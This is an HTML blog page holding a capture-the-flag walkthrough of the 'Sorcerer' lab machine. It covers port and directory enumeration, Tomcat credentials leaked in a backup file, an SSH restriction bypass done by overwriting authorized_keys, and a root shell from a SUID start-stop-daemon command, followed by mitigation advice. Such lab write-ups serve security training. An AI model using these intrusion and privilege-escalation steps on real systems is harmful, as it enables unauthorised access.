@@ -1,0 +1,532 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <title>
+  Sorcerer Offsec Walkthrough · Chief Dennis&#39; Blog
+</title>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="author" content="Dennis Drebitca">
+<meta name="description" content="
+  Sorcerer OffSec Walkthrough
+  
+    
+    Link to heading
+  
+
+
+
+  1. Introduction
+  
+    
+    Link to heading
+  
+
+This walkthrough documents the compromise of the Sorcerer machine from CyberSecLabs (CFT).
+We compromised the Sorcerer machine through classic multi-surface enumeration: multiple web servers, exposed ZIP archives leaking Tomcat credentials and SSH keys, restricted SSH bypass through editing authorized_keys, and final privilege escalation via a misconfigured SUID start-stop-daemon binary (GTFOBins).">
+<meta name="keywords" content="blog,developer,personal,cybersecurity,IT,cloud">
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Sorcerer Offsec Walkthrough">
+  <meta name="twitter:description" content="Sorcerer OffSec WalkthroughLink to heading1. IntroductionLink to headingThis walkthrough documents the compromise of the Sorcerer machine from CyberSecLabs (CFT).
+We compromised the Sorcerer machine through classic multi-surface enumeration: multiple web servers, exposed ZIP archives leaking Tomcat credentials and SSH keys, restricted SSH bypass through editing authorized_keys, and final privilege escalation via a misconfigured SUID start-stop-daemon binary (GTFOBins).">
+
+<meta property="og:url" content="http://localhost:1313/posts/offsec_sorcerer/">
+  <meta property="og:site_name" content="Chief Dennis&#39; Blog">
+  <meta property="og:title" content="Sorcerer Offsec Walkthrough">
+  <meta property="og:description" content="Sorcerer OffSec WalkthroughLink to heading1. IntroductionLink to headingThis walkthrough documents the compromise of the Sorcerer machine from CyberSecLabs (CFT).
+We compromised the Sorcerer machine through classic multi-surface enumeration: multiple web servers, exposed ZIP archives leaking Tomcat credentials and SSH keys, restricted SSH bypass through editing authorized_keys, and final privilege escalation via a misconfigured SUID start-stop-daemon binary (GTFOBins).">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-12-11T13:07:16+01:00">
+    <meta property="article:modified_time" content="2025-12-11T13:07:16+01:00">
+    <meta property="article:tag" content="Feroxbuster">
+    <meta property="article:tag" content="NFS">
+    <meta property="article:tag" content="SSH">
+    <meta property="article:tag" content="Authorized_keys">
+    <meta property="article:tag" content="SUID Privilege Escalation">
+    <meta property="article:tag" content="GTFObins">
+      <meta property="og:see_also" content="http://localhost:1313/posts/payday-walkthrough/">
+      <meta property="og:see_also" content="http://localhost:1313/posts/pelican-walkthrough/">
+      <meta property="og:see_also" content="http://localhost:1313/posts/clamav-walkthrough/">
+      <meta property="og:see_also" content="http://localhost:1313/posts/offsec_cockpit/">
+      <meta property="og:see_also" content="http://localhost:1313/posts/offsec_dvr4/">
+      <meta property="og:see_also" content="http://localhost:1313/posts/offsec_snookum/">
+
+
+
+
+<link rel="canonical" href="http://localhost:1313/posts/offsec_sorcerer/">
+
+
+<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="/css/coder.css" media="screen">
+
+
+
+
+
+
+  
+    
+    
+    <link rel="stylesheet" href="/css/coder-dark.css" media="screen">
+  
+
+
+
+ 
+  
+    
+    <link rel="stylesheet" href="/css/custom.css" media="screen">
+  
+
+
+
+
+
+<link rel="icon" type="image/svg+xml" href="/images/favicon.svg" sizes="any">
+<link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+
+
+
+
+
+
+</head>
+
+
+
+
+
+
+<body class="preload-transitions colorscheme-auto">
+  
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    
+    <a class="navigation-title" href="http://localhost:1313/">
+      Chief Dennis&#39; Blog
+    </a>
+    
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/about/">About</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/posts/">Catch The Flag</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/projects/">Projects</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/tags/">Tags</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/contact/">Contact me</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">
+            <a class="title-link" href="http://localhost:1313/posts/offsec_sorcerer/">
+              Sorcerer Offsec Walkthrough
+            </a>
+          </h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
+              <time datetime="2025-12-11T13:07:16&#43;01:00">
+                December 11, 2025
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa-solid fa-clock" aria-hidden="true"></i>
+              3-minute read
+            </span>
+          </div>
+          
+          
+          <div class="tags">
+  <i class="fa-solid fa-tag" aria-hidden="true"></i>
+    <span class="tag">
+      <a href="/tags/feroxbuster/">Feroxbuster</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="/tags/nfs/">NFS</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="/tags/ssh/">SSH</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="/tags/authorized_keys/">Authorized_keys</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="/tags/suid-privilege-escalation/">SUID Privilege Escalation</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="/tags/gtfobins/">GTFObins</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="/tags/start-stop-deamon/">Start-Stop-Deamon</a>
+    </span></div>
+
+        </div>
+      </header>
+
+      <div class="post-content">
+        
+        <h2 id="sorcerer-offsec-walkthrough">
+  Sorcerer OffSec Walkthrough
+  <a class="heading-link" href="#sorcerer-offsec-walkthrough">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p><img alt="image" src="/posts/offsec_sorcerer/Picture_0.png"></p>
+<h3 id="1-introduction">
+  1. Introduction
+  <a class="heading-link" href="#1-introduction">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>This walkthrough documents the compromise of the Sorcerer machine from CyberSecLabs (CFT).</p>
+<p>We compromised the Sorcerer machine through classic multi-surface enumeration: multiple web servers, exposed ZIP archives leaking Tomcat credentials and SSH keys, restricted SSH bypass through editing authorized_keys, and final privilege escalation via a misconfigured SUID start-stop-daemon binary (GTFOBins).</p>
+<p>The result is full root compromise, highlighting weak service isolation, exposed sensitive files, and dangerous privilege configurations.</p>
+<h3 id="2-reconnaissance">
+  2. Reconnaissance
+  <a class="heading-link" href="#2-reconnaissance">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>First, a ping is made to verify connection with the machine:</p>
+<p><img alt="image" src="/posts/offsec_sorcerer/Picture.png"></p>
+<p>The TTL value is unusual. Linux commonly uses TTL ≈ 64 and Windows ≈ 128, so a different value can indicate filtering, virtualization or a custom network stack.</p>
+<p>A full SYN scan is performed to enumerate open ports:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">sudo nmap -sS -T5 -vvv -p- <span class="nv">$tgt</span> -Pn -oN nmap_inicial
+</span></span></code></pre></div><p>Where:</p>
+<ul>
+<li>-sS: SYN scan</li>
+<li>-T5: Aggressive timing</li>
+<li>-vvv: High verbosity</li>
+<li>-p-: All ports scanned</li>
+<li>-Pn: Skip host discovery</li>
+<li>-oN: Save output in normal format</li>
+</ul>
+<p>Results:</p>
+<p><img alt="image" src="/posts/offsec_sorcerer/Picture_1.png"></p>
+<p>Then, a deeper enumeration of detected open ports:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">sudo nmap -sCV -vvv -p22,80,111,2049,7742,8080,34625,43449,45551,49951 <span class="nv">$tgt</span> -oN nmap_exhaustive
+</span></span></code></pre></div><p>Where:</p>
+<ul>
+<li>-sCV: Script + version detection</li>
+<li>-vvv: High verbosity</li>
+<li>-p: Only open ports</li>
+<li>-oN: Normal output</li>
+</ul>
+<p>Results:</p>
+<p><img alt="image" src="/posts/offsec_sorcerer/Picture_2.png"></p>
+<p>Next, directory discovery on port 80:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">feroxbuster -u http://<span class="nv">$tgt</span>:80 -x html,htm,php,txt -w /home/kali/SecLists/Discovery/Web-Content/common.txt -n
+</span></span></code></pre></div><p><img alt="image" src="/posts/offsec_sorcerer/Picture_4.png"></p>
+<p>And directory discovery on port 8080:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">feroxbuster -u http://<span class="nv">$tgt</span>:8080 -x html,htm,php,txt -w /home/kali/SecLists/Discovery/Web-Content/common.txt -n
+</span></span></code></pre></div><p><img alt="image" src="/posts/offsec_sorcerer/Picture_6.png"></p>
+<p>Attempt to mount NFS:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">sudo mount -t nfs <span class="nv">$tgt</span>: /mnt/nfs
+</span></span></code></pre></div><p><img alt="image" src="/posts/offsec_sorcerer/Picture_3.png"></p>
+<p>Tomcat landing page:</p>
+<p><img alt="image" src="/posts/offsec_sorcerer/Picture_5.png"></p>
+<p>Directory discovery on port 7742:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">feroxbuster -u http://<span class="nv">$tgt</span>:7742 -x html,htm,php,txt -w /home/kali/SecLists/Discovery/Web-Content/common.txt -n
+</span></span></code></pre></div><p><img alt="image" src="/posts/offsec_sorcerer/Picture_8.png"></p>
+<p>Landing page on 7742:</p>
+<p><img alt="image" src="/posts/offsec_sorcerer/Picture_7.png"></p>
+<p>Eventually, the /zipfiles directory is found:</p>
+<p><img alt="image" src="/posts/offsec_sorcerer/Picture_9.png"></p>
+<p>Potential usernames/passwords for spraying:</p>
+<ul>
+<li>francis</li>
+<li>max</li>
+<li>miriam</li>
+<li>sofia</li>
+</ul>
+<p>ZIP contents:</p>
+<p><img alt="image" src="/posts/offsec_sorcerer/Picture_10.png"></p>
+<h3 id="3-initial-exploitation">
+  3. Initial Exploitation
+  <a class="heading-link" href="#3-initial-exploitation">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>One extracted file stands out: tomcat-users.xml.bak</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">role</span> <span class="na">rolename</span><span class="o">=</span><span class="s">&#34;manager-gui&#34;</span><span class="p">/&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">user</span> <span class="na">username</span><span class="o">=</span><span class="s">&#34;tomcat&#34;</span> <span class="na">password</span><span class="o">=</span><span class="s">&#34;VTUD2XxJjf5LPmu6&#34;</span> <span class="na">roles</span><span class="o">=</span><span class="s">&#34;manager-gui&#34;</span><span class="p">/&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">tomcat-users</span><span class="p">&gt;</span>
+</span></span></code></pre></div><p>These credentials grant access to the Tomcat Manager GUI.</p>
+<p>The SSH key pairs found in another ZIP file:</p>
+<p><img alt="image" src="/posts/offsec_sorcerer/Picture_11.png"></p>
+<p>The scp_wrapper script shows SSH is restricted to scp-only commands:</p>
+<p><img alt="image" src="/posts/offsec_sorcerer/Picture_12.png"></p>
+<p>authorized_keys reveals enforced restrictions:</p>
+<p><img alt="image" src="/posts/offsec_sorcerer/Picture_13.png"></p>
+<p>The key file is modified locally to remove all forced commands:</p>
+<p><img alt="image" src="/posts/offsec_sorcerer/Picture_14.png"></p>
+<p>The modified authorized_keys is uploaded:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">scp -i id_rsa -O authorized_keys max@<span class="nv">$tgt</span>:/home/max/.ssh/authorized_keys
+</span></span></code></pre></div><p><img alt="image" src="/posts/offsec_sorcerer/Picture_15.png"></p>
+<p>SSH now works normally — access as max is obtained.</p>
+<p><img alt="image" src="/posts/offsec_sorcerer/Picture_16.png"></p>
+<h3 id="4-privilege-escalation">
+  4. Privilege Escalation
+  <a class="heading-link" href="#4-privilege-escalation">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>Running linpeas:</p>
+<p><img alt="image" src="/posts/offsec_sorcerer/Picture_17.png"></p>
+<p>A SUID binary is discovered: /usr/sbin/start-stop-daemon<br>
+GTFOBins confirms it can be abused:</p>
+<p><img alt="image" src="/posts/offsec_sorcerer/Picture_18.png"></p>
+<p>Exploit command:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">/usr/sbin/start-stop-daemon -n <span class="nv">$RANDOM</span> -S -x /bin/sh -- -p
+</span></span></code></pre></div><p>Root shell obtained:</p>
+<p><img alt="image" src="/posts/offsec_sorcerer/Picture_19.png"></p>
+<p>Boooooom the machine is PWNED :)</p>
+<h3 id="5-attack-mitigation">
+  5. Attack Mitigation
+  <a class="heading-link" href="#5-attack-mitigation">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<ol>
+<li>Web Application Hardening</li>
+</ol>
+<ul>
+<li>Remove backup files (e.g., *.bak) from web directories.</li>
+<li>Restrict Tomcat Manager access to internal/admin networks.</li>
+<li>Enforce strong passwords and remove unused roles.</li>
+</ul>
+<ol start="2">
+<li>SSH Security</li>
+</ol>
+<ul>
+<li>Prevent exposure of SSH private keys through NFS.</li>
+<li>Enforce proper permissions in ~/.ssh directories.</li>
+<li>Audit authorized_keys frequently.</li>
+</ul>
+<ol start="3">
+<li>Service and Filesystem Hardening</li>
+</ol>
+<ul>
+<li>Remove unnecessary SUID binaries like start-stop-daemon.</li>
+<li>Restrict or disable NFS services.</li>
+<li>Use regular auditing tools (Lynis, OpenSCAP).</li>
+</ul>
+
+      </div>
+
+
+      <footer>
+        
+
+<section class="see-also">
+  
+    
+    
+    
+      <h3 id="see-also-in-offsec">
+        See also in Offsec
+        <a class="heading-link" href="#see-also-in-offsec">
+          <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+          <span class="sr-only">Link to heading</span>
+        </a>
+      </h3>
+      <nav>
+        <ul>
+        
+        
+          
+        
+          
+            <li>
+              <a href="/posts/payday-walkthrough/">Payday Offsec Walkthrough</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="/posts/pelican-walkthrough/">Pelican Offsec Walkthrough</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="/posts/clamav-walkthrough/">ClamAV Offsec Walkthrough</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="/posts/offsec_cockpit/">Cockpit Offsec Walkthrough</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="/posts/offsec_dvr4/">DVR4 Offsec Walkthrough</a>
+            </li>
+          
+        
+        </ul>
+      </nav>
+    
+  
+</section>
+
+
+        
+        
+        
+        
+        
+        
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+      2023 -
+    
+    2025
+     Dennis Drebitca 
+  </section>
+</footer>
+
+  </main>
+
+  
+
+  
+  
+  <script src="/js/coder.js"></script>
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+
+</html>
